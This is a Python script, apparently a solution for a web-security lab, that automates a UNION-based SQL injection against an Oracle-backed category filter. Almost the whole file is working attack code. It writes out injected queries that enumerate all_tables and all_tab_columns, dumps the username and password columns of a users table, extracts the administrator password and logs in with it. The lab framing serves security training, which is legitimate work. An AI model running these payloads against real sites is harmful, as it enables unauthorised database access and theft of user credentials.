from lib import (
    SESSION,
    login_as_administrator,
    check_is_lab_solved,
    generate_parser,
    find_no_of_columns,
    find_columns_of_type_string,
    print_table,
)
import re
from lxml import html

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    columns = find_no_of_columns(f"{lab_url}/filter?category=", oracle=True)

    target_columns = find_columns_of_type_string(
        lab_url_with_end_point=f"{lab_url}/filter?category=",
        no_of_columns=columns,
        oracle=True,
    )

    users_table_name = ""
    username_column_name = ""
    password_column_name = ""
    administrator_password = ""

    print("[!] Finding the users table name")
    print("[!] Fetching the `all_tables`")

    query = "' UNION SELECT NULL, TABLE_NAME FROM all_tables --"

    print(f"[!] Making query: {lab_url}/filter?category={query}")

    response = SESSION.get(f"{lab_url}/filter?category={query}")

    if response.status_code == 200:
        results = re.search(r"\bUSERS_.+?\b", response.text)
        if results:
            users_table_name = results.group(0)

    else:
        print("[-] Failed to fetch the `all_tables`")
        exit()

    print(f"[+] Successfully enumerated the users table name: {users_table_name}")

    print("[!] Fetching the column names from the users table")
    print(f"[!] Fetching the `all_tab_columns` for table {users_table_name}")

    query = f"' UNION SELECT COLUMN_NAME, DATA_TYPE FROM all_tab_columns WHERE table_name='{users_table_name}'--"

    print(f"[!] Making query: {lab_url}/filter?category={query}")

    response = SESSION.get(f"{lab_url}/filter?category={query}")

    if response.status_code == 200:
        tree = html.fromstring(response.text)

        column_names = tree.xpath("//table/tbody/tr/th/text()")
        data_types = tree.xpath("//table/tbody/tr/td/text()")

        print(f"[+] Found the column names of the table {users_table_name}:")

        print_table(
            column_names=["Column Name", "Data Type"],
            rows=list(zip(column_names, data_types)),
        )

        for column in column_names:
            if column.startswith("PASSWORD_"):
                password_column_name = column
            if column.startswith("USERNAME_"):
                username_column_name = column

    else:
        print(f"[-] Failed to fetch the `all_tab_columns` for table {users_table_name}")
        exit()

    print(f"[!] Fetching the rows from the `{users_table_name}` table")

    query = f"' UNION SELECT {username_column_name}, {password_column_name} FROM {users_table_name}--"

    print(f"[!] Making query: {lab_url}/filter?category={query}")

    response = SESSION.get(f"{lab_url}/filter?category={query}")

    if response.status_code == 200:
        tree = html.fromstring(response.text)

        usernames = tree.xpath("//table/tbody/tr/th/text()")
        passwords = tree.xpath("//table/tbody/tr/td/text()")

        print(f"[+] Fetched the rows of the table {users_table_name}:")

        zipped = list(zip(usernames, passwords))

        print_table(
            column_names=[username_column_name, password_column_name],
            rows=zipped,
        )

        administrator_password = passwords[usernames.index("administrator")]

    else:
        print(f"[-] Failed to fetch the rows from the `{users_table_name}` table")
        exit()

    if administrator_password:
        print(f"[+] Found administrator password: {administrator_password}")
    else:
        print("[-] Failed to find administrator password")
        exit()

    login_as_administrator(lab_url, administrator_password)

    check_is_lab_solved(lab_url)
